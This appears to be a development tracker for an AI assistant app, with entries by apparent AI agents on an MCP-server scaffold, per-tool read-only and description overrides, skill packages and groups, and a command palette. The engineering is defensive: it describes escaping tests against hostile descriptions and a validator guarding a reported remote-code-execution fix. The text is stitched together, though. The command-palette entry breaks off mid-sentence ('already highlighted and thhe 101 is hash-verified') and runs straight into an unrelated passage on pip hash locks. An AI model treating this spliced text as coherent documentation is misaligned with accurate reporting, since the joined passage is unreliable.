  **"Working" is a claim, so it is checked by starting the thing.** `verify_server` connects through `McpManager.connect_server` — the method the app uses and the one `pantheon-mcp tools` uses (`Law 14`; a second launcher would be a second opinion about whether a server runs) — completes the handshake, lists the tools and disconnects. A test goes one step further and calls a generated tool through `McpManager.call_tool`, the same envelope a real turn gets: `{'stdout': "get_forecast has not been written yet. It was called with text='Tuesday'", 'stderr': '', 'exit_code': 0}`. The probe uses `asyncio.timeout` and not `asyncio.wait_for`, which was found by running it: `wait_for` wraps the call in a new Task, so `connect_server`'s `AsyncExitStack` is entered there and closed here, and anyio answered every successful run with *"Error closing MCP server …: Attempted to exit cancel scope in a different task than it was entered in"*. A test asserts that line is absent from the manager's log.
  **Nothing it writes can be text somebody typed.** Every interpolated value goes through `json.dumps`, whose output is a double-quoted literal with no raw newline and every quote and backslash escaped, and which Python reads the way JSON writes it — so seven hostile descriptions (triple quotes, a `SERVER_NAME` reassignment, an `__import__` sandwich, CRLF, NUL and BEL, `U+2028`) each produce a module whose top-level assignments are exactly `SERVER_NAME, SERVER_DESCRIPTION, TOOLS, HANDLERS, server` and whose imports are exactly the six the template has — and the text still round-trips out of the file unchanged, because escaping that loses the text is a different bug from escaping that fails. A tool name is refused if it contains `__`, because `mcp__{server_id}__{tool_name}` is `FORBIDDEN.md` Part 1 and its sole parse is one `split("__", 2)` (`P8-44`'s invariant, held here at the only place that has ever let a person name a tool); if it would shadow the generated wiring (`call_tool`, `list_tools`, `server`, `TOOLS`, …); or if it is a Python keyword. A directory name goes through the skill store's own `slugify` (`Law 14`) and is then realpath-contained anyway, which is the guard the regex cannot give: a symlink planted in the scaffold root is refused, and a test plants one.
  **It never overwrites.** There is no `--force`. A second run against a name that exists refuses and says so, because the only thing an overwrite here could destroy is code somebody wrote; a test appends a line to a generated server, runs the scaffold again, and asserts the bytes are unchanged. `server.py` is written `0o700` — it is about to be run as the app user and it will hold whatever the person puts in it.
  `Verify:` **someone who has never written an MCP server types one line and gets one that runs.** `pantheon mcp-new weather --tool get_forecast` (or `scripts/pantheon-mcp-new …`) writes `<DATA_DIR>/mcp_servers/weather/server.py` and a `README.md` beside it, starts the server, completes the MCP handshake, and prints `"self_test": {"started": true, "tools": ["get_forecast"]}` above `"next"`: *Register it: Settings → Integrations → + → MCP Tool Server — Command `/usr/local/bin/python`, Arguments `/app/data/mcp_servers/weather/server.py`, Environment empty.* Those are the three boxes on the form `P8-46` rebuilt, and the form's own live line then reads back `Pantheon will run: /usr/local/bin/python /app/data/mcp_servers/weather/server.py` before they save. The generated file is three numbered sections — what it offers, what they do, and wiring labelled *"you should not need to change anything below this line"* — and every tool answers with its own argument repeated back, so the whole chain is visible before a line of their own code exists. When they ask the assistant to register it instead, it refuses, and the README they were handed already contains that exact refusal and two paragraphs on why it is deliberate. After an edit, `pantheon mcp-new weather --check` starts the file again and exits non-zero with the reason if it broke — a syntax error comes back as *"Connection closed — anything the server printed while failing went to this process's standard error, above this"*, with the interpreter's own traceback above it, because "Connection closed" alone reads like a network fault. **The shell half of that was driven end to end on 2026-09-19**, not described: the exact `pantheon-mcp add --name weather --transport stdio --command /usr/bin/python3 --args '["…/server.py"]'` line the README prints was pasted back in, and `pantheon-mcp tools <id>` then answered with `get_forecast` and its description — scaffold, register, connect, one tool, through two CLIs neither of which knows about the other.
  `CI:` `tests/test_a_generated_mcp_server_runs.py` — **66 tests**, of which six spawn a real server. Two of them are the row's load-bearing pair and they pin the same rule from opposite sides: `_validate_mcp_command` must **refuse** the registration this scaffold produces (that test goes red the day the reported-RCE fix is weakened to make a Creator convenient), and `POST /api/mcp/servers` behind `require_admin` must **accept** it, store the absolute path and hand the manager exactly that argv. **Mutation: 16 real mutations, 16 caught** — naive quoting in place of `json.dumps`, dropping the `__` guard, dropping the reserved-name guard, dropping the realpath containment, allowing an overwrite, `0o755` on the generated file, a hardcoded refusal in place of asking the validator, a relative path in the registration, `verify_server` claiming success regardless, dropping the tool cap, dropping the duplicate check, scaffolding into the source tree instead of the volume, dropping the description cap, `wait_for` for `asyncio.timeout`, telling you to register a server that did not start, and dropping the hint about where the failure was printed.
  **Two things the merge still needs, both in files that were not mine this hour.** (a) **The door belongs on `scripts/pantheon-mcp` as a `new` subcommand, not beside it** (`Law 14`): `scripts/pantheon-mcp-new` is 43 lines of argv and an exit code over `mcp_scaffold.main`, so folding it in is moving `_build_parser`'s arguments onto a `sub.add_parser("new")`. (b) `scripts/pantheon:66` reads `re.sub(r"^pantheon-\w+\s*—\s*", "", first)`, and `\w` excludes `-`, so the dispatcher's listing prints `mcp-new    pantheon-mcp-new — make a working MCP server…` with the name twice. One character (`\w+` → `[\w-]+`) fixes it for every hyphenated subcommand; `mcp-new` is the first one this repo has had, which is why nobody has seen it. Filed as `B`-rows rather than edited. `Depends:` nothing. — agent:`p8scaffold`
- [x] **P8-48** **Per-tool description override + `readOnlyHint` / `destructiveHint` annotation UI** *(re-cut 2026-09-27 from "Tool schema editor + `readOnlyHint` / `destructiveHint` annotation UI", `D-2026-09-27-02`; the schema editor is dropped — the reason is in the last paragraph)*. — **read half shipped 2026-09-19; annotation half and the per-tool storage shipped 2026-09-19; the schema editor is NOT shipped and the reason is a measurement, not a shortage of time.** **The row's own prose is three claims and two of them expired the day `B867` landed; corrected here.** (1) *"`annotations` is not carried end to end at all"* — **false since `B867`**: `McpManager.get_all_tools` (`src/mcp_manager.py:1437`) carries `annotations` and `is_readonly`, and `manage_mcp list_tools` (`src/agent_tools/admin_tools.py:392`) returns the qualified name, structured parameters, `read_only` and `annotations`. (2) *"`CI:` … asserts `annotations` is absent, so it fails the day the backend half lands"* — that assertion was **inverted rather than deleted** when `B867` landed (`tests/test_the_mcp_form_names_the_field_js.py::test_the_payload_carries_the_schema_and_now_the_annotations`) and now pins the payload. (3) *"needs somewhere to put an override"* — **held, and it was the blocker**: `McpServer` had `disabled_tools` and no per-tool column. **Measured on the tree before this patch.** `grep -rl 'annotations\|is_readonly\|readOnlyHint\|destructiveHint' static/js/` matched exactly **one** file for the MCP sense of the words — `static/js/settings/mcpFields.js`, and only inside a comment block at `:432-437` saying `annotations` was *not* on the wire, which `B867` had already made false. **No frontend file read the field**, so a connected server's tool list drew a checkbox, a name and a description, with nothing anywhere distinguishing `read_file` from `wipe_volume`. And the verdict itself was mostly a guess: `mcp_tool_is_readonly` (`src/mcp_manager.py:585` at `HEAD`) took one argument, preferred the server's `annotations` and otherwise fell back to `name.startswith(_MCP_READONLY_VERBS)` — sixteen leading words. The MCP spec makes `annotations` optional and most servers ship none, so on a real install that verb list **is** the answer, and it is wrong in both directions: `list_and_purge_orphans` starts with `list`, so plan mode ran a purge; `tail_log` starts with nothing in the list, so plan mode refused a read. Both reproduced by driving `mcp_tool_is_readonly` and `plan_mode_blocked_mcp` before the fix (`tests/test_mcp_tool_readonly_override.py`, first two cases). The operator's only lever was `disabled_tools`, which hides the tool from the model entirely — not the same act, and it costs them the tool.
  **Storage: `McpServer.tool_overrides` (`core/database.py:625`), JSON `{"<tool>": {"read_only": true|false}}`, migrated by `_migrate_add_mcp_tool_overrides_column` (`:2315`) and wired into `init_db`.** A second column rather than a key inside `disabled_tools` because the two answer different questions in different places — one hides a tool from the model, the other changes the verdict plan mode gates on — and because keeping them apart is what lets `PUT` carry both across an edit without re-encoding either. Per-server rather than global because a tool name is only unique inside a server. **`P8-35`'s ruling extends to it unchanged: an id is an identity, not a version**, so `PUT /api/mcp/servers/{id}` does not touch it (`routes/mcp/mcp_routes.py:486`, beside `disabled_tools`), a tool the operator marked as writing keeps that mark when the command line under it changes, and names the new command no longer offers come back as `stale_tool_overrides` beside `stale_disabled_tools` (`:545`).
  **One verdict, one place, two values out.** `readonly_verdict(tool, override)` (`src/mcp_manager.py:682`) returns `(is_readonly, source)` where source is `override` > `annotation` > `heuristic`; `mcp_tool_is_readonly` (`:726`) is the same call with the provenance dropped, so its seven existing call sites are unchanged. **The source is returned rather than re-derived, and that is the reason this row could not close on `is_readonly` alone**: most servers declare nothing, so most verdicts are a guess at a verb, and a badge that renders a guess identically to a declaration is not information — it is a claim the product cannot support. `get_all_tools` (`:1437`) and `plan_mode_blocked_mcp` (`:1495`) both read the same overrides, because a panel showing an override the gate did not honour is the worst outcome available here. `get_tool_descriptions_for_prompt` passes `overrides={}` and pays for no query: it reads none of the three new fields, asserted by driving it with `SessionLocal` replaced by something that raises.
  **Route: the existing `PATCH /api/mcp/servers/{id}/tools` gains an `overrides` key** (`routes/mcp/mcp_routes.py:778`) rather than a second endpoint — the disabled list and the read/write answer are the two things a person says about one tool from one panel, stored on one row (`Law 13`/`Law 14`), and the new key inherits the `require_admin` the route already had rather than re-spelling a `FORBIDDEN.md` Part 2 control. **A key that is absent is left alone**, so the existing checkbox save path, which has never heard of overrides, cannot erase one (`Law 1`); `{"tool": null}` or `{}` is the erase; entries are merged, not replaced; names the connected server does not offer are kept and reported as `unknown_tools`, the same honesty as `stale_disabled_tools`.
  **Browser: `describeReadonly` (`static/js/settings/mcpFields.js:517`) and a badge on the collapsed row** — `Read-only` / `Writes` / `Destructive`, each followed by *(the server says so)*, *(guessed from the name)* or *(you set this)*, with a guess drawn dashed and at 60% so a guess and a declaration never read as the same statement. It is on the **closed** row because "which of these can change something" is asked about the whole list at once. Nothing is re-derived: a JavaScript copy of the precedence rule could not be kept in step with the Python one the gate runs (`Law 14`). Expanding gives the sentence and three buttons — `Read-only`, `It writes`, `Server's answer` — because "take my answer back" is a real third state a checkbox cannot hold, plus the consequence in words. **An override that contradicts the server names what it overrode** (*"You marked "wipe" read-only on this install. Plan mode will run it. The server itself declares it destructive."*) and never attributes the word *destructive* to an operator who said *writes*. Nothing repaints optimistically, so a refusal has nothing to roll back and cannot leave a button pressed for a state the server never accepted. `static/js/settings.js:5626` wires it: PATCH, then read the verdict back from the one endpoint that computes it — clearing an override on an annotated server must fall back to *the server's word*, and a browser that assumed "cleared means guessed" would be wrong on every annotated server. `manage_mcp list_tools` gained `read_only_source` (`src/agent_tools/admin_tools.py:445`) so the model and the operator cannot be told different things about one tool.
  **NOT SHIPPED: the tool schema editor, and this is a recommendation, not a pause.** The storage it was blocked on now exists and would take one key beside `read_only`; the remaining work is `get_all_openai_schemas` (`src/mcp_manager.py:1397`), which hands the model `tool.get("input_schema")` verbatim. **What stops it is a measurement:** `McpManager.call_tool` (`:1221`) passes `arguments` straight to `session.call_tool` with no client-side validation, and the MCP server enforces its own schema. So an edited schema is advisory to the model only — narrowing one changes nothing the server will refuse, widening one produces a server-side error whose cause the operator cannot see, and either way the product has told the model something false about a third party's tool. Two fields on that entry *are* worth overriding and both are about how a tool is described rather than what it accepts: the annotation (shipped here) and the description. **I recommend the row be re-cut as "per-tool description override" and the `input_schema` editor be dropped with this reason recorded.** That is the owner's call, so the row stays open.
  `Verify:` an operator opens **Settings → MCP**, clicks a connected server, and the tool list now reads `list_and_purge_orphans  Read-only (guessed from the name)`, `tail_log  Read-only (you set this)`, `wipe  Destructive (the server says so)` — measured end to end through the real route and the real module. They press the parameter disclosure on `tail_log` and read *"This server does not say whether its tools write … so Pantheon assumes it writes. Plan mode will refuse it."*, press **Read-only**, and the badge changes to `Read-only (you set this)` — after which `plan_mode_blocked_mcp` stops blocking it, on the same call. No devtools, no MCP server documentation, nothing read out of `src/`.
  `CI:` `tests/test_mcp_tool_readonly_override.py` (new, **46 cases**, all driving the code: the two premise misreadings reproduced first, the migration run against a table built without the column and run twice for idempotence, twelve normalisation cases, ten precedence cases, the gate and the payload asked independently and required to agree tool for tool, per-server scoping, both routes, the admin gate, and `manage_mcp`), plus **12 new cases** in `tests/test_the_mcp_form_names_the_field_js.py` (56 total) driving the real module under node — including one that asks Python for every source it can emit and requires the badge to read each of the three differently, which is the `Law 13` pin across a boundary that cannot share a constant. **Mutation-checked: 24 mutations run, 21 caught, and the three survivors are each reported rather than rounded off.** Caught: dropping the override branch from the verdict; the gate not loading overrides; the payload always claiming `annotation`; `PUT` wiping the column; `PATCH` replacing instead of merging; `PATCH` ignoring the key; `PATCH` accepting a non-boolean `read_only`; clearing an override becoming a no-op; the migration not adding the column; the model losing `read_only_source`; the badge always claiming the server declared it; the badge forgetting `annotation` or `override`; drawing a guess exactly like a declaration; calling a guess a declaration in words; a synchronous `onOverride` throw swallowed as success; the refusal path not reporting; putting *destructive* in the operator's mouth; hiding what an override contradicted; renaming a source in Python. Survivors: (1) `verdictEntry = previous` in the refusal path — **dead, and deleted**, because nothing repaints before the server answers, so a refusal has nothing to roll back; the reason is written at the site. (2) removing `'heuristic'` from the badge's recognised-source list — a **genuine no-op**, since an unrecognised source already falls back to `heuristic`; left alone. (3) claiming *destructive* without the server having said so — **a real gap the tests did not cover**, fixed by requiring `source === 'annotation'` and by naming the contradiction an override makes, and caught on the re-run. `.pantheon/release-gate.py --fast` passes, 26 steps, no ratchet moved (`silent-failures` held at 402 after the one new `except: pass`, a session teardown, was explained in place). `Depends:` `P8-35`, `B867`. — agent:`p8final`
  **Re-cut half done 2026-09-27.** **What the model reads about a tool reaches it three ways, and the decision named one.** Measured: the function schema (`get_all_openai_schemas`, `src/mcp_manager.py:1483`), the MCP block of the prompt (`get_tool_descriptions_for_prompt`, `:1678`, which is also the text `src/tool_index.py` embeds for retrieval), and `manage_mcp list_tools`. An override applied to the first alone would tell the model two different things about one tool in one turn, so all three ask one function, `description_verdict(tool, override)` (`:805`) → `(text, override|server)`, the same shape as `readonly_verdict` for the same reason (`Law 13`). **Storage:** a `description` key beside `read_only` in the same `McpServer.tool_overrides` entry — no migration. `clean_tool_description` (`:623`) is the one reading: plain text, line endings to `\n`, control characters other than tab and newline removed, trimmed, blank meaning "no override", markup kept as the characters it is (the browser draws it with `textContent`). At most `MCP_TOOL_DESCRIPTION_MAX` = **1024** (`:608`): **refused** past that at the route with both numbers, never cut — storing less than was typed, with a 200, is the silent kind of wrong; the reader cuts only as a backstop for a row written some other way. **Route:** the existing `PATCH /api/mcp/servers/{id}/tools` (`routes/mcp/mcp_routes.py:857`) under its existing `require_admin`; the merge now goes one level down because an entry holds two answers — `{"read_only": null}` or `{"description": null}` takes back one key, a whole-entry `null`/`{}` still takes back both (`Law 1`); refusals name the tool and the key (not text, empty — "send null", over-long, unknown key listing both keys). A changed description moves the manager's generation (`tool_descriptions_changed`, `:1654`) so the cached prompt block and the tool index see it at once; a read-only answer does not, so nothing re-embeds for a change the model cannot read. **Payload:** `description` (what the model reads), `server_description`, `description_source`, `description_max`; `manage_mcp list_tools` adds `description_source: "override"` when rewritten and says nothing otherwise, like `annotations` and `override` beside it. **Browser:** the closed row reads *"— Sales figures only… (your wording)"* when the words are the operator's; the panel's "What the model is told" shows whose words they are, the server's own beside a rewrite, a box, a count (`N of 1024 characters`), **Save wording** (disabled when there is nothing to save) and **Use the server's** (only when there is a rewrite to take back); the server's own words typed back are sent as the erase, since stored as a rewrite they would pin today's wording and hide the server's next change; nothing repaints before the server answers, a refusal keeps what was typed, and the answer is `role="status"`. `settings.js` saves both answers through one function (`saveToolOverride`, `:5634`), and **`Server's answer` now sends `{"read_only": null}`** — it sent `null` for the whole entry, which would now have taken the operator's wording with it. **Found and fixed:** override keys went through `_sanitize_schema_token(name, 40)`, so a 46-character name was stored as `list_repository_collaborators_with_permi…`, a key no tool is called — accepted with a 200 and then ignored, by plan mode too (marked *It writes*, still run in plan mode on the `list…` guess). Names are kept exactly now, up to `MCP_TOOL_OVERRIDE_NAME_MAX` = 128 (`:616`), and refused past that with a sentence. **Corrected:** `test_the_prompt_text_is_unchanged_and_pays_for_no_query` could not fail — its stub raised `AssertionError`, which `load_tool_overrides`' `except Exception` answers with `{}` — and was about to be untrue besides; it is a session counter now: one session on a cache miss, none on a hit. **A limit, stated:** the prompt block still cuts every description at 120 characters, as it always has; the function schema carries an override whole. **The schema editor, dropped, and the reason pinned.** `McpManager.call_tool` hands `arguments` to `session.call_tool` with no client-side check, and the server enforces its own `inputSchema`; so an edited schema changes only what the model is told — narrowing refuses nothing the server would accept, widening produces a server-side error whose cause the operator cannot see, and either way the product has told the model something false about a third party's tool. `test_call_tool_hands_the_server_arguments_its_own_schema_forbids` sends a tool arguments its own schema forbids and shows them arriving untouched; it goes red the day client-side validation appears, so the decision is re-opened by a test rather than by somebody remembering it. `Verify:` an operator opens **Settings → MCP**, clicks a connected server, expands a tool and reads *"What the model is told — These are the server's own words."* with the server's sentence in the box, types a better one and presses **Save wording**; the closed row now ends *"(your wording)"*, the panel shows the server's own words beside theirs, and the next turn's function schema and the prompt's MCP block both carry the new sentence; **Use the server's** puts it back. No devtools, nothing read out of `src/`. `CI:` `tests/test_mcp_tool_description_override.py` (**46**, all driving the code: the schema-editor premise, the reading of the value, the long-name defect reproduced, one verdict, every channel and their agreement, per-server scoping, the payload, `manage_mcp`, the prompt cache on a write and on a hit, the route's merge, erase and refusals, the admin gate, an edit keeping the wording) — **34 red at `HEAD`**; the 12 that pass there are the premise pin, "nothing stored / nothing changed" guards, the admin gate and the channel-agreement invariant — plus `tests/test_the_model_is_told_the_operators_words_js.py` (**19**, under node against the real module, fed Python's own `get_all_tools` entries; `settings.js`'s three save bindings are cut out with `js_binding` and run against a recording `fetch`) — **all red at `HEAD`** (16 on the old `mcpFields.js`, 3 on the old `settings.js`) — and the corrected case in `tests/test_mcp_tool_readonly_override.py` (46). **Mutation: 33 run, 33 caught** — the verdict ignoring the override; the schema, the prompt block (`overrides={}` again) or the payload using the server's words; the description dropped, uncapped, kept with control characters or HTML-escaped; names truncated again; the route replacing the entry, refusing `read_only: null`, cutting instead of refusing, taking empty as the erase, never moving the generation or moving it on every save, not checking the name cap; `manage_mcp` always claiming an override; the payload losing the cap; the closed row never saying whose; untrimmed text sent; the server's words stored as a rewrite; a refusal clearing the box; an optimistic repaint; the server's words drawn as markup; the reset always offered; Save enabled or clickable over the limit; an unknown source read as the operator's; the editor built without a setter; `settings.js` sending a whole-entry `null`, the wording under the wrong key, or skipping the read-back; the status not announced. `Depends:` `P8-35`, `B867`. — agent:`p8-workshop`
- [x] **P8-49** **A repository imports as a package — every skill in it, filed under the sections it
  declares.** The owner, 2026-09-30: *"adding a multi-layer skill package also does not build its
  segmented 'category' and group skills together... Which it should."* He pasted
  `npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend"` and chose,
  asked, **the whole package even when `--skill` names one** (`D-2026-09-30-01`). — **done 2026-09-30.**
  `fetch_skill_package` (`services/memory/skill_importer.py`) fetches GitHub's archive of the repository
  from `codeload.github.com` — **one paced request instead of one per file, and not the 60-an-hour API**
  — reads only regular files (no links, no devices), runs every path through `_safe_relpath`, caps the
  download while it streams (100 MB, a new `max_bytes` on the pinned transport), the unpacked walk
  (500 MB), the skills (100), and the text kept (40 MB), and keeps the per-skill caps `B926` raised. The
  sections are `.claude-plugin/marketplace.json`'s — `anthropics/skills` is document-skills,
  example-skills, claude-api, academy-guide and discernment-nudge — and each skill is filed under its
  section's category, or the package's when it declares one. `anthropics/skills`' `template/` is not a
  skill and is not imported: declared folders, then `…/skills/<name>/`, then a root SKILL.md, and only
  when there are none of those a top-level folder. `SkillsManager.install_package` records the package
  (`owner--repo`) with the local name of each folder, so **importing again refreshes in place**: same
  names, the old SKILL.md kept in `versions/`, and the status and confidence a person gave them left
  alone. A name someone else has is never overwritten (`brandkit` → `brandkit-2`, and the answer says
  so). A link to one skill's folder imports that skill through the old path and files it under its
  package; importing the repository later joins them into one. `Verify:` paste the owner's line in the
  Skills window's Add tab; the window opens on **taste-skill · 13** with `design-taste-frontend` open.
  **Measured against the real archives**, fetched through the owner's machine because this container
  cannot reach GitHub: taste-skill gives 13 skills in one section; anthropics/skills 19 in five.
  `CI:` `tests/test_a_skill_package_arrives_as_a_package.py` (39 cases, six mutations caught). A whole
  repository over 100 MB is refused with the sentence to link one folder instead — agent:`integrator`
- [x] **P8-50** **Groups reference skills; they never copy them.** The owner asked which is better —
  duplicate or cross-reference — *"as of right now - as standard practice (in mcp's) - I duplicate
  them"*, and chose reference (`D-2026-09-30-01`). — **done 2026-09-30.** `SkillCollections`
  (`services/memory/skill_collections.py`) holds packages and groups in one guarded sidecar,
  `skills/_collections.json`, owner-scoped the way skills are; a group is a title and a list of names.
  **A rename is carried to every group and package that lists the skill, and a delete leaves them** —
  a reference that could dangle is a copy with extra steps. Groups can hold bundled skills. Routes:
  `POST /api/skills/groups`, `PATCH`/`DELETE /api/skills/groups/{id}` (names checked against what the
  person can see). The file is `P3-16`-guarded: a damaged one reads as empty, so injection keeps
  working, and is never written back over. `Verify:` in the Skills window press **+ New**, name it
  *Design*, and add two skills from their ⋯ menus; the group reads `Design 2` and the skills are still
  one each under **All skills**. `CI:` same file — agent:`integrator`
- [x] **P8-51** **A package or a group switches its skills off as a set.** — **done 2026-09-30.**
  `SkillsManager.load_active` is `load()` without the skills a switched-off package or group holds, and
  **every path that decides what the model is shown reads it**: the injected catalogue (`index_for`),
  keyword retrieval (`agent_loop._build_system_prompt`), the tool-selection pass, and the model's own
  `manage_skills list`/`search`. `view` by exact name still opens one — a person naming a skill, not the
  model finding it. **Off wins**: switching a package back on does not re-enable a skill a group still
  holds off, and `GET /api/skills/collections` says which (`off: {name: [titles]}`), so the card's `off`
  pill can too. `Verify:` switch *Design* off; its skills show `off` and neither is in **Prompt preview**.
  `CI:` the whole message array of one agent request, with the skill in a switched-off group, carries
  neither its catalogue line nor its matched procedure (`test_a_switched_off_skill_is_in_no_part_of_what_the_model_is_sent`).
  The tool-selection site is switched and not separately pinned — agent:`integrator`
- [x] **P8-52** **Fork — the one deliberate copy.** — **done 2026-09-30.** `SkillsManager.fork_skill`
  and `POST /api/skills/{name}/fork`: a separately named copy of a skill's folder, the person's own,
  in no package and no group, with *Forked from `name`* in its body. A bundled skill can be forked — the
  other way to change one besides shadowing it under its own name. `Verify:` ⋯ → **Fork** on a
  built-in skill, name it, and it opens under **Yours**. `CI:` same file — agent:`integrator`

# P9 · Feature surfaces
*Area: `surfaces` · Depends: P5*

**`Law 15` applies to every row in this phase.** It draws surface a person has to operate, and the law exists because the owner stopped using a competitor's *more advanced* version of this product for one reason: *"There's no tutorials and the learning curve is too steep for the little amount of time I have."* A row here is not done because the feature works — it is done when someone who has not read this tracker can find it, tell what state it is in, and use it without being told how. Put that in the row's `Verify:` line, in those terms.

### Theme expansion — additive, no dependency on anything
- [ ] **P9-15** **New themes.** The system takes them cleanly: five colours plus an optional
  `advanced` block, one entry in `THEMES`, one line in `THEME_DEFAULT_PATTERN`. Nothing else
  changes. `Depends:` P1-01, so a new theme can ship its own `accent` from day one.
- [ ] **P9-16** **ASCII-art backgrounds as a ninth pattern class.** Subtle, per-theme, behind
  everything — `terminal` wants something very different from `ume`. Slots into the existing
  machinery: one entry in `_BG_CLASSES`, one in `_CANVAS_PATTERNS`, one init function beside the
  seven that already exist, and `--bg-effect-color/intensity/size` come free. It can be a canvas
  animator like the other seven, or CSS-only like `dots` if the art is static. **Read
  `FORBIDDEN.md` § The theme system first** — this extends that machinery, it does not replace it.
  `Depends:` nothing. `Verify:` selecting a theme with an ASCII pattern renders it behind the app
  at the configured intensity, and `prefers-reduced-motion` stops any animation without hiding
  the art.

- [x] **P9-01** **Command palette**, framed as extending the existing search rather than a parallel component. Every data source is already a registry: slash commands, settings panels with keywords, the modal auto-wire map, the route table. **`#search-overlay`, `#search-input` and `#search-results` must stay in the DOM** — five call sites including the rail button and `/find`. — **done 2026-09-30. The search overlay is the palette — the markup had called it "Ctrl+K command palette" since the fork while it found only chat messages. Three of the four registries held; the route table is real and the wrong shape; `/find` was never a caller; and the box being extended opened *behind* every tool window.**
  **Measured before a line was written**, in the real app under headless Chromium: Ctrl+K opened the box and Escape left focus on `<body>` — the composer lost its caret on every lookup; nothing stopped that keypress, so it also reached `cancel: 'escape'` (`keyboard-shortcuts.js:312`, which calls `abortCurrentRequest()` — read from the code; no model streams in this environment); and with Calendar open the overlay's stylesheet z-index (300) lost to the window's (1001 — `ui.js:1583` promotes every visible `.modal` from 1000, and `modalManager.js:66` raises from 300), so `elementFromPoint` at the search box's centre answered `#cal-quickadd` while keystrokes went into a box nobody could see. **The callers, counted:** the rail button and the sidebar button (`app.js`), the page-wide Escape chain (`app.js`), `init`, and the `search` keybind (`keyboard-shortcuts.js`). **`/find` is not one and never was** — `_cmdSearch` (`slashCommands.js:1999`) asks `/api/search` itself and replies in the chat, as `VERIFY-2026-08-27.md:224` already said; FORBIDDEN.md Part 1 still says otherwise (text for it below). **The route table is `app.js:_routeOpen` (`:1177`)** — eight URL paths that open a tool on page load. It is read as a premise and not used as a source: it is a closure inside `initializeEventListeners`, seven of its windows are ones `_AUTO_WIRE` already names, and its openers are page-load deep links — `/email` presses `#rail-new-session` first, so a palette pointed at it would make "Email" start a new chat.
  **Extended, not rebuilt (`Law 14`).** `static/js/search-chat.js` still owns the three ids, and every source is a registry that already existed, read and never copied: **Tools** from `_AUTO_WIRE` and `_LABELS` through `modalManager.listWindows()` (`:1508`), offered when a door is not hidden *on its own* — an admin's feature flag, a privilege gate and Customize UI all write `display: none` on the button itself, while a collapsed sidebar or rail takes nothing away, because that is when the palette is the way in — and opened by `showWindow()` (`:1540`), the dock chip's three cases in its order: restore if minimized, **raise and press nothing if open** (most doors are toggles, so "Calendar" with Calendar up would otherwise close it), else `openClosedWindow` (`P9-11`). The two windows `_AUTO_WIRE` names with no button to press open through the one function every other way in calls (`_DOOR_FUNCTIONS`, `search-chat.js:221`): Settings through `settingsModule.open()` (its entry names `tool-settings-btn`, which no template renders — filed below) and **the Skills window (`P9-06`) through `openSkillsWindow('browse')`** — what the Brain's launcher card (`data-open-skills="browse"`) and a chat's skills pill call; never the Brain's button. **Settings panels** from the registry's own `searchSettingsPanels`, with the Settings finder's harvested control text (`controlTextFor`, now exported from `settings/search.js:22`) and its admin rule, so the palette and the finder always find the same panels; opened by `settingsModule.open(panel)`, the door `/settings <tab>` and `adminModule.open` use. **Commands** from the composer popup's own catalogue (`slashCatalog`, `slashAutocomplete.js:92`) — hidden commands and easter eggs stay hidden. **Chats** from `/api/search`, exactly as before: same URL, same `limit=20`, same 300 ms debounce, grouped under their chat's title; `_searchChats` (`:331`) is the one function `P9-15c`'s keyword-and-meaning search would replace, so this row does not block it.
  **The palette changes nothing itself.** It opens windows and Settings through their own doors and puts a chosen command **in the message box** (`insertSlashToken`, now shared with the `/` popup's own insert) for the composer's submit path — with its approval, setup-mode and in-flight checks — to run; calling `handleSlashCommand` directly would have skipped them. A draft already in the box is never overwritten: the palette stays open and says *"Your message box has a draft. Send or clear it, then choose /rename again."* So there is no approval, `require_admin` check or setting it could route around — it has no path of its own to any of them.
  **Keyboard alone, and said out loud.** The box is a `combobox` over a `listbox` of groups (`Tools`, `Settings`, `Commands`, then each chat), names the highlighted option with `aria-activedescendant`, keeps the caret, and marks the option with the existing tint plus an inset bar — a shape, not hue alone. ↑/↓ move and stop at the ends; Enter chooses; **Escape closes, hands focus back to where it came from, and goes no further** (the keypress no longer reaches the stream stop bound to Escape, or a calendar's own Escape handler underneath); Tab stays in the box. `#search-status` (`role="status"`) says *"8 results. ↑ ↓ to move, Enter to select, Esc to close."*, only says *"Nothing matches “x”."* once the chats have answered, and says so when the chat search fails (it went to `console.error`). The box takes its z from the live stack on every open (`topPortalZ`, `P3-18`'s answer). Commands are drawn before chats so the chats arriving 300 ms later never move the highlighted row, which also survives the redraw. Tools and commands match on word starts — measured first with substrings, "cal" offered `/setup` and `/usage` because their help says "local"; a bare `/` offers only commands. Every row is built from text nodes: the old renderer was an `innerHTML` template with `esc`, and its highlight ran over the *escaped* snippet, so "amp" matched inside `&amp;`; a stale chat answer could overwrite a newer query's list, and now cannot.
  **One key, already registered.** Ctrl+K was the `search` keybind — registered, rebindable in Settings → Shortcuts, printed by `/shortcuts` — and already opened this overlay; a second binding for the same box would be a second way in. Its label is now *"Search chats and commands"* (`keyboard-shortcuts.js:54`; the id is a persisted key and does not move), and the rail and sidebar tooltips say the same. No new `var(--accent)` (814 held), no new `:focus-visible` rule (50/47 held), one scoped block in `static/style.css`, nothing animated. **Measured on all sixteen palettes** in Chromium: the new secondary text (`--color-muted-alt`) and the group headings read at 4.56–7.25:1 on the box; an option's own label is `--fg`, so it reads at each palette's own body-text contrast — 3.26 on `cute` and 4.46 on `retrowave`, the same as every message in those themes (`B15`).
  `Verify:` someone who has never seen it presses **Ctrl+K** (or the Search button) and reads *"Search chats, tools, settings and commands…"*; types *cal* and sees **Calendar** under *Tools* already highlighted and thhe 101 is hash-verified — `pip-audit` says
  as much on every run ("users are encouraged to fully hash their pinned dependencies"). The
  stronger answer is `requirements.in` + a `pip-compile --generate-hashes` lock. It was **not**
  done in this wave, for a reason worth recording rather than repeating: a correct lock has to be
  generated on the interpreter and platform the image uses, and this environment has CPython 3.11
  on one architecture while the image is CPython 3.14 built for **both** `linux/amd64` and
  `linux/arm64` (`docker-publish.yml`). Environment markers are evaluated by the generating
  interpreter — `pip --python-version` does not change that, as `B320` measured when
  `kokoro`'s `python_version < "3.13"` marker stayed true under `--python-version 3.14` — so a
  lock generated here would be wrong about markers and would carry only one architecture's wheel
  hashes. A lock that is wrong is worse than no lock: it fails the arm64 build at install time,
  or silently pins the wrong set. **Do this on a 3.14 host with both platforms available**, keep
  `requirements.txt`'s 27 comment lines as `requirements.in`'s comments (`Law 1`), and teach
  `.pantheon/check-pins.py` that a lock file must be newer than the `.in` it came from.
  `Verify:` `pip install --require-hashes -r requirements.lock` succeeds in the image on both
  architectures, and changing `requirements.in` without regenerating the lock fails the gate.
  `Depends:` `B320` (landed). — found while pinning dependencies — agent:`pins`

  **Still open 2026-09-16 — but the stated blocker is not the blocker, and that is worth recording
  rather than repeating a third time.** The refusal above rests on *"environment markers are
